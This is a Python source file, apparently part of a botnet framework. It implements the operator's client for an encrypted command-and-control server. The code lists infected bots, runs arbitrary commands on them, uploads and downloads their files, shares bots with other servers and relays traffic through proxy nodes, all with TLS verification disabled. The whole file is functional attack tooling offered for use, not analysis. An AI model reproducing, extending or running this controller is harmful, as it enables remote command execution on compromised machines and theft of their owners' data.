import requests
import os
from inspect import isfunction
from requests.packages.urllib3 import disable_warnings

from modules.Ciphers import POO_RSA

from utils.Checks import check_headers
from utils.Wrappers import wrap
from utils.Ciphers import hibrid
from utils.sys_utils import set_proxy

from conf import global_conf

class requestError(Exception):'''
Cuando hay un error en la petición
'''

disable_warnings()

class control(object):

    def __init__(self, address, path, init_uniqkey, port=80, proto='https', recover=False, chars=global_conf.hashing['chars'], iterations=global_conf.hashing['iterations'], security_number=global_conf.hashing['security_number'], decrement_number=global_conf.hashing['decrement_number'], callback=None):

        if not (isfunction(callback)) and not (callback == None):

            raise RuntimeError('¡El llamado no es una función!')

        else:

            self.callback = callback

        set_proxy.autoconf()

        self.__init_uniqkey = str(init_uniqkey)

        self.__url = '%s://%s:%d/%s' % (str(proto), str(address), int(port), str(path))

        self.__rsa = POO_RSA.main()
        self.__rsa_server = POO_RSA.main()
        self.__secundaryRSA = POO_RSA.main()

        self.__chars = str(chars)
        self.__iterations = int(iterations)
        self.__security_number = int(security_number)
        self.__decrement_number = int(decrement_number)

        self.__headers = None
        self.__secundaryHeaders = None
        
        self.raw_response = None

        self.__recover = recover

        self.use_nodes = False 

    def setServerCredentials(self, pub_key):

        self.__rsa_server.import_PublicKey(str(pub_key))
        self.__pub_key = self.__rsa_server.export_PublicKey()

    def setCredentials(self, username, passphrase):

        self.__username = str(username)
        self.__passphrase = str(passphrase)

    def setKey(self, priv_key):

        self.__rsa.import_PrivateKey(str(priv_key))

    def setHeaders(self, key, value):

        if (self.__headers == None):

            self.__headers = {}

        self.__headers[key] = value

    def resetHeaders(self):

        self.__headers = None

    def __encryptData(self, data):

        return(hibrid.encrypt(str(data), self.__rsa_server.export_PublicKey()))

    def __decryptData(self, data):

        try:

            data = hibrid.decrypt(data, self.__rsa.export_PrivateKey())

            self.__init_uniqkey = str(data[-1])

            if not (self.use_nodes == False):

                secundaryData = hibrid.decrypt(data[1], self.__secundaryRSA.export_PrivateKey())
                _use_nodes_bak = self.use_nodes
                self.use_nodes = False
                obj = wrap.getall(wrap.USE_NODE_INFO)['nodes']
                self.updateNode(_use_nodes_bak, hibrid.encrypt(secundaryData[-1], obj[_use_nodes_bak][0]), -1, 3)
                self.use_nodes = _use_nodes_bak

                return(secundaryData)

        except KeyError:

            raise ValueError('No hay información alamacenada de forma local')

        except ValueError:

            raise requestError('Error descodificando los datos! ...')

        else:

            return(data)

    def __sendData(self, request, recover=False):

        if not (isinstance(request, tuple) == True):

            raise TypeError('El tipo de dato de los datos a enviar no son correctos.')

        if not (len(request) == 2):

            raise ValueError('La longitud de la tupla no es igual a 2')

        if not (isinstance(request[0], str)):

            raise TypeError('El tipo de dato de la clave no es correcta')

        if (request[0].strip() == ''):

            raise TypeError('La clave no puede estar vacia')

        data = {
                'username'          :   self.__username,
                'passphrase'        :   self.__passphrase,
                'uniqkey'           :   self.__init_uniqkey,
                'chars'             :   self.__chars,
                'security_number'   :   self.__security_number,
                'decrement_number'  :   self.__decrement_number,
                'iterations'        :   self.__iterations,
                'data'              :   (request, (self.use_nodes, self.__secundaryHeaders))
                }

        if (recover == True):

            data['uniqkey'] = 'recover:%s' % (self.__init_uniqkey)

        response = requests.post(
                url=self.__url,
                data=hibrid.encrypt(
                    data,
                    self.__rsa_server.export_PublicKey()
                    ),
                headers=self.__headers,
                verify=False,
                timeout=global_conf.connector['timeout']
                )

        self.raw_response = response

        if not (self.callback == None):

            self.callback(response)

        return(self.__decryptData(response.content))

    # Ahorro de tiempo

    def __simplySendData(self, data):

        try:

            try:

                return(self.__sendData(data))

            except requestError:

                if not (self.__recover == True):

                    return(False)

                else:

                    try:

                        return(self.__sendData(data, recover=True))

                    except requestError:

                        return(False)
    
        except Exception as Except:

            return(False, str(Except))

    def uniqkey(self):

        return(self.__init_uniqkey)

    # Command's

    def listBots(self, limits=0, pattern=''):

        return(self.__simplySendData(('listBots', (limits, pattern))))

    def getData(self, bot_id, limits=0):

        return(self.__simplySendData(('getData', (bot_id, limits))))

    def getCommands(self, bot_id, limits=0):

        return(self.__simplySendData(('getCommands', (bot_id, limits))))

    def executeCommand(self, bot_id, cmd):

        return(self.__simplySendData(('executeCommand', (bot_id, cmd))))

    def shareBot(self, bot_id, secundaryServerAddr, api_key, headers=None, shareFiles=False):

        check_headers.check(headers)

        return(self.__simplySendData(('shareBot', (bot_id, secundaryServerAddr, api_key, headers, shareFiles))))

    def listServers(self, bot_id, limits=0):

        return(self.__simplySendData(('listServers', (bot_id, limits))))

    def delServer(self, bot_id, index=-1):

        return(self.__simplySendData(('delServer', (bot_id, int(index)))))

    def getToken(self):

        return(self.__simplySendData(('getToken', None)))

    def addNode(self, node_id, node):

        if not (isinstance(node, list) == True):

            raise TypeError('El tipo de dato no es el correspondiente')

        if (len(node) != 2):
            
            raise TypeError('La longitud de la lista, no es correcta y tiene que seguir la siguiente sintaxis: (Node, Token)')

        return(self.__simplySendData(('addNode', (node_id, node))))

    def writeNodes(self, nodes, node_info):

        if not (isinstance(nodes, list) == True) or not (isinstance(node_info, list) == True):

            raise TypeError('El tipo de dato no es el correspondiente')

        for _ in nodes:

            if not (isinstance(_, list) == True):

                raise TypeError('El tipo de dato de "%s" no es una lista' % (_))

            if (len(_) != 3):

                raise TypeError('La longitud de la lista (%s) no es correcta y tiene que seguir la siguiente sintaxis: (Node, Token, Secret Key)' % (_))

        if not (len(node_info) == 11):

            raise TypeError('La longitud del último nodo no tiene una longitud correcta y debe seguir la siguiente Síntaxis: (Node, Username, Passphrase, Uniqkey, Public Key Server, Your Private Key, Recover, Iteration\'s, Security Number, Decrement Number, Security Character\'s)')

        _cipher = lambda data: hibrid.encrypt(data, node_info[4])

        _username = _cipher(node_info[1])
        _passphrase = _cipher(node_info[2])
        _iteration = _cipher(str(node_info[7]))
        _securityNumber = _cipher(str(node_info[8]))
        _decrementNumber = _cipher(str(node_info[9]))
        _securityCharacters = _cipher(str(node_info[10]))

        _uniqkey = node_info[3] if (node_info[6] == False) else 'recover:%s' % (node_info[3])

        _private_key_node = node_info[5]

        node_info[1] = _username
        node_info[2] = _passphrase
        node_info[3] = _cipher(_uniqkey)
        node_info[7] = _iteration
        node_info[8] = _securityNumber
        node_info[9] = _decrementNumber
        node_info[10] = _securityCharacters

        node_info.pop(5)
        node_info.pop(5)

        nodes.append(node_info)

        _data = self.__simplySendData(('writeNodes', nodes))

        try:

            if (_data[1][1][0] == -1):
                
                return(_data)

        except (TypeError, IndexError, KeyError):

            pass

        if (_data == False):

            return(_data)
        
        elif (_data[1][0] == False):

            return(_data)

        else:

            if (_data[1][1] == None):

                return(_data)

        obj = wrap.getall(wrap.USE_NODE_INFO)

        if (obj.get('nodes') == None):

            obj = {}

        else:

            obj = obj['nodes']

        obj[_data[1][1]] = (node_info[4], _private_key_node)

        if (wrap.add('nodes', obj, agent=wrap.USE_NODE_INFO) == True):

            return(_data)

        else:
            
            return(False)

    def getNodes(self, action='all'):

        return(self.__simplySendData(('getNodes', action)))
 
    def delNodes(self, node, action='all'):
        
        return(self.__simplySendData(('delNodes', (node, action))))

    def useNodes(self, node_id, headers=None):

        check_headers.check(headers)

        _data = self.getNodes(node_id)

        if not (_data == False):

            try:

                obj = wrap.read('nodes', node_id, agent=wrap.USE_NODE_INFO)

                if (obj == False):

                    return(False)

                self.__secundaryRSA.import_PrivateKey(obj[1])
            
                self.use_nodes = node_id
                self.__secundaryHeaders = headers

            except KeyError:

                return(False)

        return(_data)

    def updateNode(self, node_id, value, index, subindex):

        return(self.__simplySendData(('updateNode', (node_id, value, index, subindex))))

    def access_list(self, limit=0):

        return(self.__simplySendData(('access_list', limit)))

    def ping(self):

        return(self.__simplySendData(('ping', None)))

    def sharedFiles(self, bot_id, limit=0, pattern=''):

        return(self.__simplySendData(('sharedFiles', (bot_id, limit, pattern))))

    def listFiles(self, bot_id, limit=0, pattern=''):

        return(self.__simplySendData(('listFiles', (bot_id, limit, pattern))))

    def download(self, filename, outname, bot_id):

        return(self.__simplySendData(('download', (filename, bot_id))))

    def upload(self, filename, bot_id, recursive=False, recursive_limit=0):

        _limit = 1
        _result = []

        if (os.path.isfile(filename)):

            with open(filename, 'rb') as file_object:

                return([self.__simplySendData(('upload', (file_object.read(), filename, bot_id)))])

        elif (os.path.isdir(filename)):

            if not (recursive == True):

                for _ in os.listdir(filename):

                    _file = '%s/%s' % (filename, _)

                    if (os.path.isfile(_file)):

                        with open(_file, 'rb') as file_object:

                            _result.append(self.__simplySendData(('upload', (file_object.read(), _, bot_id))))

            else:

                for root, path, _file in os.walk(filename):

                    if (recursive_limit == _limit):

                        break

                    for filepath in _file:

                        _filename = os.path.join(root, filepath)

                        if (os.path.isfile(_filename) == True):

                            with open(_filename, 'rb') as file_object:

                                _result.append(self.__simplySendData(('upload', (file_object.read(), os.path.basename(_filename), bot_id))))

                        if (recursive_limit == _limit):

                            break

                        _limit += 1

            return(_result)

        else:

            return(False)

    def getPeers(self):

        return(self.__simplySendData(('getPeers', None)))

    def addQueue(self, command, bot_id, data={}):

        if not (isinstance(data, dict)):

            raise TypeError('Los parámetros no son válidos')

        return(self.__simplySendData(('addQueue', (command, bot_id, data))))
